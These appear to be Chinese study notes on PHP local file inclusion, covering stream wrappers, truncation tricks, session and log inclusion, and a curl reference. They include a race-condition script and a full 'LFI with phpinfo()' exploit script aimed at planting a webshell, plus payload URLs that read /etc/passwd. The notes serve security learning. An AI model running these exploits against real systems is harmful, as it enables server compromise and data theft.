# 安全牛文件包含学习笔记

<div class="has-toc have-toc">
</div>

## 0x00 常见文件包含情况

相关函数：  
• include() 路径不存在时，发出警告，但继续执行后续代码  
• include_once() 不会再次包含  
• require() 路径不存在时，发出警告，不执行继续执行后续代码  
• require_once() 不会再次包含

包含的时候，不一定是要去包含php文件（即非可执行的php文件），只要包含一块完整php代码即可，<?php XXX ?>

重点在于找到可控文件

allow\_url\_include  
This option allows the use of URL-aware fopen wrappers with the following functions: include, include\_once, require, require\_once.

伪协议<figure class="wp-block-image size-full">

<img loading="lazy" width="631" height="516" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-80.png" alt="" class="wp-image-2544" /> </figure> 

## 0x01 Phar://和Zip://

PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。

`phar:// [压缩文件路径]#[压缩文件内的子文件名]`

zlib:// -- bzip2:// -- zip:// — 压缩流，更重要的是不需要指定后缀名，可修改为任意后缀：`jpg png gif xxx`&nbsp;等等。

`zip://[压缩文件路径]#[压缩文件内的子文件名]`,%23可替换#。

  * <var>compress.zlib://file.gz</var>
  * <var>compress.bzip2://file.bz2</var>
  * <var>zip://archive.zip#dir/file.txt</var>

## 0x02  filter和input伪协议、日志文件、session

<var>php://filter</var> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file\_get\_contents()， 在数据流内容读取之前没有机会应用其他过滤器。

<var>php://filter</var> 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。<figure class="wp-block-image size-full">

<img loading="lazy" width="1299" height="281" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-81.png" alt="" class="wp-image-2549" /> </figure> 

范例：`php://filter/read=convert.base64-encode/resource=[文件名]`

不要read也可以正常跑，但不标准

<var>php://input</var> 是个可以访问请求的原始数据的只读流。 在POST请求中访问POST的`data`部分，在`enctype="multipart/form-data"` 的时候`php://input `是无效的。

利用条件：  
1、allow\_url\_include = On。  
2、对 allow\_url\_fopen 不做要求。

| 字符串过滤器            | 作用                               |
| ----------------- | -------------------------------- |
| string.rot13      | 等同于`str_rot13()`，rot13变换         |
| string.toupper    | 等同于`strtoupper()`，转大写字母          |
| string.tolower    | 等同于`strtolower()`，转小写字母          |
| string.strip_tags | 等同于`strip_tags()`，去除html、PHP语言标签 |</figure> <figure class="wp-block-table">

| 转换过滤器                                                             | 作用                                                |
| ----------------------------------------------------------------- | ------------------------------------------------- |
| convert.base64-encode & convert.base64-decode                     | 等同于`base64_encode()`和`base64_decode()`，base64编码解码 |
| convert.quoted-printable-encode & convert.quoted-printable-decode | quoted-printable 字符串与 8-bit 字符串编码解码               |</figure> <figure class="wp-block-table">

| 压缩过滤器                             | 作用                                                                |
| --------------------------------- | ----------------------------------------------------------------- |
| zlib.deflate & zlib.inflate       | 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 |
| bzip2.compress & bzip2.decompress | 同上，在本地文件系统中创建 bz2 兼容文件的方法。                                        |</figure> <figure class="wp-block-table">

| 加密过滤器      | 作用               |
| ---------- | ---------------- |
| mcrypt.*   | libmcrypt 对称加密算法 |
| mdecrypt.* | libmcrypt 对称解密算法 |</figure> 

很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。

PHP 默认生成的 Session 文件往往存放在 /tmp 目录下。存储路径在phpinfo的`session.save_path`。

## 0x03 session.upload_progress.enable

session.upload\_progress.enabled这个参数在php.ini 默认开启，需要手动置为Off，如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到。/var/lib/php/sess\_{your\_php\_session_id}

session.upload_progress.enabled : 是否启用上传进度报告(默认开启)

session.upload_progress.cleanup: 是否在上传完成后及时删除进度数据(默认开启),生成的文件会定时清空，不能写入恶意代码，这时候需要条件竞争。<a href="https://findneo.github.io/181123-one-line-php-challenge/" data-type="URL" data-id="https://findneo.github.io/181123-one-line-php-challenge/" target="_blank" rel="noreferrer noopener" rel="nofollow" >参考代码</a>示例如下：

```python
#loop.py
import os
from multiprocessing.dummy import Pool as threadpool

sessname="iamnotorange"
def runner(i):
	cmd="curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=%s' -F 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking' -F 'file=@/etc/passwd' 1>/dev/null"%sessname
	os.system(cmd)
	os.system("xxd /var/lib/php/sessions/sess_%s "%sessname)
pool=threadpool(30)
result=pool.map_async(runner,range(30)).get(0xffff)
```

curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。参考自：<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a>

```
-A参数指定客户端的用户代理标头，即User-Agent。curl 的默认用户代理字符串是curl/[version]
范例：curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com

-b参数用来向服务器发送Cookie。
范例1：curl -b 'foo=bar' https://google.com
范例2：curl -b 'foo1=bar;foo2=bar2' https://google.com
范例3：curl -b cookies.txt https://www.google.com

-c参数将服务器设置的Cookie 写入一个文件。
范例：curl -c cookies.txt https://www.google.com

-d参数用于发送POST请求的数据体。
范例1：curl -d'login=emma＆password=123'-X POST https://google.com/login
范例2：curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login

--data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。

-e参数用来设置HTTP的标头Referer，表示请求的来源。
范例：curl -e 'https://google.com?q=example' https://www.example.com

-F参数用来向服务器上传二进制文件。
范例1：curl -F 'file=@photo.png' https://google.com/profile
上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。
-F参数可以指定MIME类型。
范例2：curl -F 'file=@photo.png;type=image/png' https://google.com/profile
上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为application/octet-stream。
-F参数也可以指定文件名。
curl -F 'file=@photo.png;filename=me.png' https://google.com/profile
上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。

-G参数用来构造GET请求URL的查询字符串。
范例：curl -G -d 'q=kitties' -d 'count=20' https://google.com/search


-H参数添加 HTTP 请求的标头。
范例1：curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com
范例2：curl -d '{"login": "emma", "pass": "123"}' -H 'Content-Type: application/json' https://google.com/login
上面命令添加 HTTP 请求的标头是Content-Type: application/json，然后用-d参数发送 JSON 数据。

-i参数打印出服务器回应的 HTTP 标头。
范例：curl -i https://www.example.com

-I参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。

-k参数指定跳过 SSL 检测。

-L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。

--limit-rate用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。
范例：curl --limit-rate 200k https://google.com


-o参数将服务器的回应保存成文件，等同于wget命令。
范例：curl -o example.html https://www.example.com
上面命令将www.example.com保存成example.html。

-O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。
范例：curl -O https://www.example.com/foo/bar.html
上面命令将服务器回应保存成文件，文件名为bar.html。


-s参数将不输出错误和进度信息。
如果想让 curl 不产生任何输出，可以使用curl -s -o /dev/null https://google.com

-S参数指定只输出错误信息

-u参数用来设置服务器认证的用户名和密码。
范例1：curl -u 'bob:12345' https://google.com/login
上面命令设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。
范例2： curl https://bob:12345@google.com/login
上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。
范例3： curl -u 'bob' https://google.com/login
上面命令只设置了用户名，执行后，curl 会提示用户输入密码。

-v参数输出通信的整个过程，用于调试。

--trace参数也可以用于调试，还会输出原始的二进制数据。

-x参数指定 HTTP 请求的代理。
范例1：curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com
上面命令指定 HTTP 请求通过myproxy.com:8080的 socks5 代理发出。
范例2：curl -x james:cats@myproxy.com:8080 https://www.example.com
如果没有指定代理协议，默认为 HTTP。

-X参数指定 HTTP 请求的方法。
```

## 0x04 远古截断、利用phpinfo包含临时文件

phpinfo中open_basedir能够查看用户能够访问的路径。

`%00`截断(需要 magic\_quotes\_gpc=off，PHP小于5.3.4有效(?))

范例：url/?page=phpinfo.txt%00

路径长度截断：`./`和`.`(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)

范例： url/?page=phpinfo.txt.(n个.)

向服务器上任意php文件以form-data方式提交请求上传数据时，会生成临时文件,通过phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。

```python
#!/usr/bin/env pyhon
# -*-coding: utf-8 -*-

"""
php 处理脚本执行完后再删除临时文件，间隔时间极短
"""

import sys
import threading
import socket
import logging
from argparse import ArgumentParser

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def setup(host, port):

    tag = "Security Test"
    boundary = '---------------------------11008921013555437861019615112'#分隔符
    #
     
    # php_path maybe '/lfi_phpinfo' or ''
    php_path = ''
     
    payload = "{tag}\r\n".format(tag=tag)
    payload += '<?php                                                                  ?>\');?>'
     
    req_data = '--{b}\r\n'.format(b=boundary)
    req_data += 'Content-Disposition: form-data; name="file"; filename="file.txt"\r\n'
    req_data += 'Content-Type: text/plain\r\n'
    req_data += '\r\n'
    req_data += '{payload}\r\n'.format(payload=payload)
    req_data += '--{b}--'.format(b=boundary)
     
    # padding for delay php server delete tmp file
    # 这种方式是phpinfo返回发送的头信息，信息过大的话就采用分块传输，padding增加了传输时间,根据需要改
    padding = 'A' * 8000
     
    req = 'POST {path}/phpinfo.php?a={padding} HTTP/1.1\r\n'.format(path=php_path, padding=padding)
    req += 'Host: {host}\r\n'.format(host=host)
    req += 'Cookie: othercookie={padding}\r\n'.format(padding=padding)
    req += 'User-Agent: {padding}\r\n'.format(padding=padding)
    #req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    req += 'Accept: {padding}\r\n'.format(padding=padding)
    req += 'Accept-Language: {padding}\r\n'.format(padding=padding)
    req += 'Accept-Encoding: {padding}\r\n'.format(padding=padding)
    req += 'Content-Type: multipart/form-data; boundary={b}\r\n'.format(b=boundary)
    req += 'Content-Length: {l}\r\n'.format(l=len(req_data))
    req += 'Connection: close\r\n'
    req += '\r\n'
    req += '{data}'.format(data=req_data)
     
    # modify this to suit the LFI script
    lfi_req = 'GET {path}/lfi.php?load=%s HTTP/1.1\r\n'.format(path=php_path)
    lfi_req += 'Connection: Keep-alive\r\n'
    lfi_req += 'Host: %s\r\n'
    lfi_req += '\r\n'
     
    return (req, tag, lfi_req)

 


def lfi_phpinfo(host, port, phpinfo_req, offset, lfi_req, tag):
    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s1.connect((host, port))
    s2.connect((host, port))
     
    s1.sendall(phpinfo_req)
    data = ""
    while len(data) < offset:
        data += s1.recv(offset)
     
    try:
        index = data.index("[tmp_name] =>")
        fn = data[index+17: index+31]
    except ValueError as e:
        err_msg = "fetch temp file path error: {e}".format(e=e)
        log.error(err_msg)
        return None
     
    s2.sendall(lfi_req % (fn, host))
     
    data = s2.recv(4096)
     
    # debug
    log.debug(data)
     
    s1.close()
    s2.close()
     
    if data.find(tag) != -1:
        return fn

 

counter = 0


class ThreadWorker(threading.Thread):

    def __init__(self, event, lock, maxattempts, *args):
        threading.Thread.__init__(self)
        self.event = event
        self.lock = lock
        self.maxattempts = maxattempts
        self.args = args
     
    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1
     
            try:
                x = lfi_phpinfo(*self.args)
                if self.event.is_set():
                    break
                if x:
                    info_msg = "\nGot it! Shell created in /tmp/g"
                    log.info(info_msg)
                    self.event.set()
            except socket.error:
                return

 

def getoffset(host, port, phpinfo_req):
    """Gets offset of tmp_name in php output
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(phpinfo_req)

    data = ""
    while True:
        rcv_data = s.recv(4096)
     
        data += rcv_data
        if rcv_data == "":
            break
     
        # detect the final chunk
        if rcv_data.endswith("0\r\n\r\n"):
            break
     
    s.close()
     
    # debug
    #log.debug(data)
     
    index = data.find("[tmp_name] =>")
    if index == -1:
        raise ValueError("No php tmp_name in phpinfo output")
     
    info_msg = "found {file} at {index}".format(file=data[index:index+10], index=index)
    log.info(info_msg)
     
    # padded up a bit
    return index+256

 

def main():

    banner = "LFI with phpinfo()\n"
    banner += "=" * 30
    print(banner)
     
    usage = "python {prog} host [port] [threads]. -h for help".format(prog=sys.argv[0])
     
    parser = ArgumentParser(usage=usage)
    parser.add_argument('host', help="ip or domain, e.g. 127.0.0.1")
    parser.add_argument('-p', dest='port', type=int, default=80,
            help="port, default is 80")
    parser.add_argument('-t', dest='threads', type=int, default=10,
            help="use n threads to access, default is 10")
    args = parser.parse_args()
     
    host = args.host
    port = args.port
    poolsz = args.threads
     
    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        err_msg = "Error with hostname {h}:{err}".format(h=sys.argv[1], err=e)
        log.error(err_msg)
        sys.exit(1)
     
    info_msg = "Getting initial offset ..."
    log.info(info_msg)
     
    req, tag, lfi_req = setup(host, port)
     
    #debug_msg = '\n\n'.join([req, tag, lfi_req])
    #log.debug(debug_msg)
     
    offset = getoffset(host, port, req)
     
    sys.stdout.flush()
     
    maxattempts = 500
    event = threading.Event()
    lock = threading.Lock()
     
    tp = []
     
    for i in range(poolsz):
        tp.append(ThreadWorker(event, lock, maxattempts, host, port, req, offset, lfi_req, tag))
     
    for t in tp:
        t.start()
     
    try:
        while not event.wait(0.5):
            if event.is_set():
                break
            with lock:
                sys.stdout.write("\r\n% 4d / % 4d\n" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
     
        if event.is_set():
            info_msg = "Wowo! \m/"
        else:
            info_msg = ":("
        log.info(info_msg)
     
    except KeyboardInterrupt:
        info_msg = "\nTelling threads to shutdown..."
        log.info(info_msg)
        event.set()
     
    info_msg = "Shutting down..."
    log.info(info_msg)
     
    for t in tp:
        t.join()

if __name__ == "__main__":
    main()
```

## 0x05 自包含、php7SegmentFault

/a.php?include=a.php  
这样a.php会将它本身包含进来，而被包含进来的a.php再次尝试处理url的包含请求时，再次将自己包含进来，形成了无穷递归，递归会导致爆栈，使php无法进行此次请求的后续处理，然后就能进行包含啦！

本地文件包含漏洞可以让 php 包含自身从而导致死循环,然后 php 就会崩溃 ，如果请求中同时存在一个上传文件的请求的话 , 这个文件就会被保留，include.php?file=php://filter/string.strip_tags/resource=/etc/passwd

参考：<a href="https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.jianshu.com/p/dfd049924258</a>
